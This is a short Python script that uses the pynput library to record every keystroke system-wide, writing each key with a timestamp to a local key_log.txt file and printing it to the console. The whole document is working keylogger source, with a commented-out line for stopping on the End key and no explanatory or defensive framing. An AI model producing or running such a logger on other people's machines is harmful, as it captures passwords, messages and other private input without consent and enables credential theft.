from pynput.keyboard import Key, Listener
import logging
import os


log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s:   %(message)s')



def on_press(key):

    logging.info(str(key))
    print('{0}'.format(key))
    from pynput import keyboard
    #if key == keyboard.Key.end:
     #   listener.stop()
      


with Listener(on_press=on_press) as listener:
    listener.join()